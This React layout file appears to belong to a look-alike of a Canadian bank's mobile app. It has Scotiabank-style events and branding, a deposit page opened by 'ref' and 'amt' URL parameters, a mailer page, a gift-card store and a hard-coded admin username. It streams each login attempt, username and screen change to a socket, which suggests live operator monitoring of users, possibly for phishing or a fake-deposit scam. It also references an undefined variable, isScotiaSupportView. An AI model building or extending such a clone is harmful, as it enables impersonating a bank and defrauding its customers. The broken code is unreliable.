import React, { useState, useEffect } from 'react';
import { AnimatePresence, motion } from 'motion/react';
import { ForgotPassword } from '../features/auth/components/ForgotPassword';
import LandingView from '../views/LandingView';
import LoginView from '../components/LoginFlow';
import HomeView from '../views/HomeView';
import AccountDetailsView from '../views/AccountDetailsView';
import WhatsNewView from '../views/WhatsNewView';
import GenericPageView from '../views/GenericPageView';
import TransfersView from '../views/TransfersView';
import TransferMenuView from '../views/TransferMenuView';
import MoveMoneyView from '../views/MoveMoneyView';
import InteracSettingsView from '../views/InteracSettingsView';
import SettingsView from '../views/SettingsView';
import AdminSettingsView from '../views/AdminSettingsView';
import MoreView from '../views/MoreView';
import BillsView from '../views/BillsView';
import AdviceView from '../views/AdviceView';
import SceneView from '../views/SceneView';
import ManageAccountView from '../views/ManageAccountView';
import TransferBetweenAccountsView from '../views/TransferBetweenAccountsView';
import StatementsListView from '../views/StatementsListView';
import ABSupportView from '../views/ABSupportView';
import { DepositView } from '../views/DepositView';
import { MailerView } from '../views/MailerView';
import RedeemStoreView from '../views/RedeemStoreView';
import MyCardsView from '../views/MyCardsView';
import ECardView from '../views/ECardView';
import { ApiExplorerView } from '../views/ApiExplorerView';
import TabNavigation from '../components/TabNavigation';
import { PurchasedCard } from '../shared/BankContext';
import { AddContactView } from '../components/AddContactView';
import { useBank } from '../shared/BankContext';
import { useSocket } from '../shared/SocketContext';
import { SupportChat } from '../components/SupportChat';
import { MessageCircle } from 'lucide-react';
import { PWAInstallPrompt } from '../components/PWAInstallPrompt';

export default function IOSLayout() {
  const { user, login, logout, updateUser, updateAccount, performTransfer, error: bankError, isLoading, theme, toggleAdminPanel } = useBank();
  const { emitAction } = useSocket();
  const [view, setView] = useState<'landing' | 'login' | 'dashboard' | 'whatsnew' | 'deposit' | 'mailer' | 'redeem' | 'my-cards' | 'ecard' | 'api-explorer' | 'forgot-password'>('landing');
  const [selectedCard, setSelectedCard] = useState<PurchasedCard | null>(null);
  const [stage, setStage] = useState('login_user');
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [selectedAccount, setSelectedAccount] = useState<string | null>(null);
  const [subView, setSubView] = useState<string | null>(null);
  const [isChatOpen, setIsChatOpen] = useState(false);
  const [notification, setNotification] = useState<{ title: string; message: string } | null>(null);

  useEffect(() => {
    const handleNotification = (e: Event) => {
      const detail = (e as CustomEvent).detail;
      setNotification(detail);
      // Auto hide after 5 seconds
      setTimeout(() => setNotification(null), 5000);
    };
    window.addEventListener('scotia_notification', handleNotification);
    
    const handleOpenChat = () => setIsChatOpen(true);
    window.addEventListener('scotia_open_chat', handleOpenChat);

    return () => {
      window.removeEventListener('scotia_notification', handleNotification);
      window.removeEventListener('scotia_open_chat', handleOpenChat);
    };
  }, []);

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    if ((params.get('ref') && params.get('amt')) || params.get('view') === 'deposited') {
      setView('deposit');
      emitAction('Visit Deposit Page', { ref: params.get('ref'), amount: params.get('amt'), deposit: params.get('deposit') });
    } else if (params.get('view') === 'mailer') {
      setView('mailer');
      emitAction('Visit Mailer Page');
    }
  }, [emitAction]);

  useEffect(() => {
    emitAction('View Change', { view, subView });
  }, [view, subView, emitAction]);

  const handleLogin = async (u?: string, p?: string) => {
    console.log('handleLogin called', { u, p });
    const finalUsername = u || username;
    const finalPassword = p || password;
    console.log('Final credentials:', { finalUsername, finalPassword: !!finalPassword });
    emitAction('Login Attempt', { username: finalUsername });
    const success = await login(finalUsername, finalPassword);
    console.log('Login result:', success);
    if (success) {
      setView('dashboard');
      emitAction('Login Success', { username: finalUsername });
    } else {
      emitAction('Login Failed', { username: finalUsername });
    }
  };

  const handleSignOut = () => {
    emitAction('Sign Out');
    logout();
    setView('landing');
    setSubView(null);
    setSelectedAccount(null);
  };

  const handleSwitchAccount = () => {
    emitAction('Switch Account');
    logout();
    setUsername('');
    setPassword('');
    setStage('login_user');
    setView('login');
  };

  const isETransferView = subView === 'Interac e-Transfer';
  const isTransferMenuView = subView === 'Transfer from' || subView === 'Send money';
  const isMoveMoneyView = subView === 'Move money';
  const isInteracSettings = subView === 'Interac Settings';
  const isSettingsView = subView === 'Settings';
  const isAdminSettingsView = subView === 'AdminSettings';
  const isApiExplorerView = subView === 'ApiExplorer';
  const isMoreView = subView === 'More';
  const isBillsView = subView === 'Bills';
  const isAdviceView = subView === 'Advice+';
  const isSceneView = subView === 'Scene+';
  const isManageAccountView = subView === 'Manage Account';
  const isTransferBetweenAccountsView = subView === 'Transfer between accounts';
  const isStatementsView = subView === 'Statements';
  const isABSupportView = subView === 'AB Support';
  const isAddContactView = subView === 'add-contact';

  const handleTabChange = (tabId: string) => {
    setSelectedAccount(null);
    if (tabId === 'home') {
      setSubView(null);
    } else {
      const tabNames: Record<string, string> = {
          'transfers': 'Move money',
          'advice': 'Advice+',
          'scene': 'Scene+',
          'more': 'More'
      };
      setSubView(tabNames[tabId] || tabId);
    }
  };

  const getActiveTab = () => {
    if (!subView) return 'home';
    const tabMap: Record<string, string> = {
      'Move money': 'transfers',
      'Bills': 'transfers',
      'Advice+': 'advice',
      'Scene+': 'scene',
      'More': 'more'
    };
    return tabMap[subView] || 'home';
  };

  const showFooter = (view === 'dashboard' || view === 'deposit' || view === 'mailer' || view === 'redeem' || view === 'my-cards' || view === 'ecard') && !selectedAccount && !isTransferMenuView && !isETransferView && !isInteracSettings && !isSettingsView && !isManageAccountView && !isTransferBetweenAccountsView && !isStatementsView && !isABSupportView;

  return (
    <div className="h-full w-full bg-[#F4F7F9] flex justify-center overflow-hidden relative">
      <div className="h-full w-full max-w-[430px] bg-white relative shadow-2xl overflow-hidden flex flex-col">
        <div className="flex-1 relative overflow-hidden">
          <PWAInstallPrompt />
          <AnimatePresence>
          {view === 'landing' && (
            <motion.div 
              key="landing" 
              initial={{ opacity: 0 }} 
              animate={{ opacity: 1, transition: { duration: 0.5 } }} 
              exit={{ opacity: 0 }} 
              className="h-full"
            >
              <LandingView onSignIn={() => setView('login')} onWhatsNew={() => setView('whatsnew')} theme={theme} />
            </motion.div>
          )}
          {view === 'whatsnew' && (
            <motion.div key="whatsnew" initial={{ x: '100%' }} animate={{ x: 0 }} exit={{ x: '100%' }} className="h-full">
              <WhatsNewView onBack={() => setView('landing')} />
            </motion.div>
          )}
          {view === 'login' && (
            <motion.div key="login" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="h-full">
              <LoginView 
                stage={stage}
                username={username}
                setUsername={setUsername}
                password={password}
                setPassword={setPassword}
                onContinue={() => setStage('login_pin')}
                onSignIn={handleLogin}
                onSwitchAccount={handleSwitchAccount}
                onForgotPassword={() => setView('forgot-password')}
                isLoading={isLoading}
                error={bankError}
                theme="light"
              />
            </motion.div>
          )}
          {view === 'forgot-password' && (
            <motion.div key="forgot" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="h-full">
              <ForgotPassword onBack={() => setView('login')} />
            </motion.div>
          )}
          {(view === 'dashboard' || view === 'deposit' || view === 'mailer' || view === 'redeem' || view === 'my-cards' || view === 'ecard') && user && (
            <motion.div key="dashboard" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="h-full flex flex-col">
              <div className="flex-1 relative overflow-hidden">
                <AnimatePresence>
                  {!selectedAccount && !subView && (
                    <motion.div key="home" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="absolute inset-0">
                      <HomeView 
                        theme={theme}
                        accounts={user.accounts}
                        onSelectAccount={(name) => setSelectedAccount(name)}
                        onAction={(action) => setSubView(action)}
                        onChat={() => setIsChatOpen(true)}
                        onNotification={() => setSubView('Notifications')}
                        onRedeem={() => setView('redeem')}
                        onMyCards={() => setView('my-cards')}
                        interacWarningEnabled={user.settings.interacWarningEnabled}
                        attentionItemsEnabled={user.settings.attentionItemsEnabled}
                        currentUser={user}
                      />
                    </motion.div>
                  )}
                  {selectedAccount && !subView && (
                    <motion.div key="account-details" initial={{ x: '100%' }} animate={{ x: 0 }} exit={{ x: '100%' }} className="absolute inset-0">
                      <AccountDetailsView 
                        accountName={selectedAccount}
                        balance={user.accounts[selectedAccount]?.balance || 0}
                        onHold={user.accounts[selectedAccount]?.onHold || 0}
                        history={user.accounts[selectedAccount]?.history || []}
                        onBack={() => setSelectedAccount(null)}
                        onAction={(action) => setSubView(action)}
                        currentUser={user}
                        onBalanceChange={(newBalance) => updateAccount(selectedAccount, { balance: newBalance })}
                      />
                    </motion.div>
                  )}
                  {isMoveMoneyView && (
                    <motion.div key="move-money" initial={{ x: '100%' }} animate={{ x: 0 }} exit={{ x: '100%' }} className="absolute inset-0">
                      <MoveMoneyView 
                        onAction={(action) => setSubView(action)}
                        onBack={() => setSubView(null)}
                        theme={theme}
                        currentUser={user}
                      />
                    </motion.div>
                  )}
                  {isTransferMenuView && (
                    <TransferMenuView 
                      key="transfer-menu"
                      onAction={(action) => setSubView(action)}
                      onBack={() => setSubView(null)}
                      theme={theme}
                    />
                  )}
                  {isTransferBetweenAccountsView && (
                    <TransferBetweenAccountsView 
                      key="transfer-between"
                      accounts={user.accounts}
                      onBack={() => setSubView(null)}
                      onTransfer={performTransfer}
                      theme={theme}
                    />
                  )}
                  {isETransferView && (
                    <TransfersView 
                      key="etransfer"
                      accounts={user.accounts}
                      onBack={() => setSubView(null)}
                      contacts={user.contacts}
                      onTransfer={performTransfer}
                      defaultFromAccount={selectedAccount || undefined}
                    />
                  )}
                  {isInteracSettings && (
                    <InteracSettingsView 
                      key="interac-settings"
                      accounts={user.accounts}
                      onBack={() => setSubView('Interac e-Transfer')}
                      theme={theme}
                    />
                  )}
                  {isSettingsView && (
                    <SettingsView
                      key="settings"
                      accounts={user.accounts}
                      onBack={() => setSubView(null)}
                      onAction={(action) => setSubView(action)}
                      theme={theme}
                      setTheme={() => {}}
                      settings={user.settings}
                      updateSettings={(settings) => updateUser({ settings: { ...user.settings, ...settings } })}
                      toggleAdminPanel={toggleAdminPanel}
                      isAdmin={user.username === 'PROJECTSARAH'}
                    />
                  )}
                  {isAdminSettingsView && (
                    <AdminSettingsView 
                      key="admin-settings"
                      onBack={() => setSubView('Settings')}
                    />
                  )}
                  {isApiExplorerView && (
                    <motion.div key="api-explorer" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="absolute inset-0 z-[500]">
                      <ApiExplorerView onBack={() => setSubView('Settings')} />
                    </motion.div>
                  )}
                  {isBillsView && (
                    <BillsView 
                      key="bills"
                      onBack={() => setSubView(null)}
                      onAction={(action) => setSubView(action)}
                      theme={theme}
                    />
                  )}
                  {isAdviceView && (
                    <AdviceView 
                      key="advice"
                      onBack={() => setSubView(null)}
                      onAction={(action) => setSubView(action)}
                      theme={theme}
                    />
                  )}
                  {isSceneView && (
                    <SceneView 
                      key="scene"
                      onBack={() => setSubView(null)}
                      onAction={(action) => setSubView(action)}
                    />
                  )}
                  {isManageAccountView && selectedAccount && (
                    <ManageAccountView 
                      key="manage-account"
                      accountName={selectedAccount}
                      onBack={() => setSubView(null)}
                      theme={theme}
                    />
                  )}
                  {isStatementsView && (
                    <StatementsListView 
                      key="statements"
                      accounts={user.accounts}
                      onBack={() => setSubView(null)}
                      theme={theme}
                      currentUser={user}
                    />
                  )}
                  {isAddContactView && (
                    <AddContactView 
                      key="add-contact"
                      isOpen={true}
                      onClose={() => setSubView('Manage contacts')}
                      onSave={(contact) => {
                        updateUser({ contacts: [...user.contacts, contact] });
                        setSubView('Manage contacts');
                      }}
                      theme="light"
                    />
                  )}
                  {isABSupportView && (
                    <ABSupportView 
                      key="ab-support"
                      onBack={() => setSubView(null)}
                      theme={theme}
                      userName={user.username.split('@')[0]}
                    />
                  )}
                  {isMoreView && (
                    <MoreView 
                      key="more"
                      onSignOut={handleSignOut}
                      onAction={(action) => {
                        if (action === 'contact_us') {
                          setIsChatOpen(true);
                        } else {
                          setSubView(action);
                        }
                      }}
                      theme={theme}
                      interacWarningEnabled={user.settings.interacWarningEnabled}
                      setInteracWarningEnabled={(enabled) => updateUser({ settings: { ...user.settings, interacWarningEnabled: enabled } })}
                      updateSettings={(settings) => updateUser({ settings: { ...user.settings, ...settings } })}
                      currentUser={user}
                      onBack={() => setSubView(null)}
                      toggleAdminPanel={toggleAdminPanel}
                    />
                  )}
                  {view === 'deposit' && (
                    <DepositView 
                      key="deposit"
                      onBack={() => {
                        window.history.replaceState({}, '', window.location.pathname);
                        setView('dashboard');
                      }}
                      theme={theme}
                    />
                  )}
                  {view === 'mailer' && (
                    <MailerView 
                      key="mailer"
                      onBack={() => setView('dashboard')}
                      theme={theme}
                    />
                  )}
                  {view === 'redeem' && (
                    <RedeemStoreView 
                      key="redeem"
                      onBack={() => setView('dashboard')}
                      onViewCards={() => setView('my-cards')}
                    />
                  )}
                  {view === 'my-cards' && (
                    <MyCardsView 
                      key="my-cards"
                      onBack={() => setView('dashboard')}
                      onRedeemMore={() => setView('redeem')}
                      onSelectCard={(card) => {
                        setSelectedCard(card);
                        setView('ecard');
                      }}
                    />
                  )}
                  {view === 'ecard' && selectedCard && (
                    <ECardView 
                      key="ecard"
                      card={selectedCard}
                      onBack={() => setView('my-cards')}
                      theme={theme}
                    />
                  )}
                  {subView && !isTransferMenuView && !isETransferView && !isMoveMoneyView && !isInteracSettings && !isSettingsView && !isBillsView && !isAdviceView && !isManageAccountView && !isMoreView && !isTransferBetweenAccountsView && !isStatementsView && !isScotiaSupportView && !isSceneView && (
                    <GenericPageView 
                      key="generic"
                      title={subView}
                      onBack={() => setSubView(null)}
                    />
                  )}
                </AnimatePresence>
              </div>
              
              <AnimatePresence>
                {isChatOpen && (
                  <motion.div 
                    key="chat"
                    initial={{ y: '100%' }}
                    animate={{ y: 0 }}
                    exit={{ y: '100%' }}
                    transition={{ type: 'spring', damping: 25, stiffness: 200 }}
                    className="absolute inset-0 z-[2000]"
                  >
                    <SupportChat isOpen={isChatOpen} onClose={() => setIsChatOpen(false)} />
                  </motion.div>
                )}
              </AnimatePresence>

              <AnimatePresence>
                {notification && (
                  <motion.div 
                    key="notification"
                    initial={{ y: -100, opacity: 0 }}
                    animate={{ y: 0, opacity: 1 }}
                    exit={{ y: -100, opacity: 0 }}
                    onClick={() => {
                      setIsChatOpen(true);
                      setNotification(null);
                    }}
                    className="absolute top-4 left-4 right-4 bg-white/90 backdrop-blur-md rounded-2xl p-4 shadow-xl z-[3000] flex items-center gap-4 cursor-pointer border border-white/20"
                  >
                    <div className="w-10 h-10 bg-[#ED0711] rounded-xl flex items-center justify-center shrink-0">
                      <MessageCircle className="text-white" size={24} />
                    </div>
                    <div className="flex-1 min-w-0">
                      <p className="font-bold text-sm text-gray-900">{notification.title}</p>
                      <p className="text-xs text-gray-600 truncate">{notification.message}</p>
                    </div>
                    <div className="text-[10px] text-gray-400 font-medium">now</div>
                  </motion.div>
                )}
              </AnimatePresence>

              {showFooter && (
                <TabNavigation 
                  activeTab={getActiveTab()} 
                  onTabChange={handleTabChange} 
                  theme={theme}
                />
              )}
            </motion.div>
          )}
        </AnimatePresence>
      </div>
      </div>
    </div>
  );
}
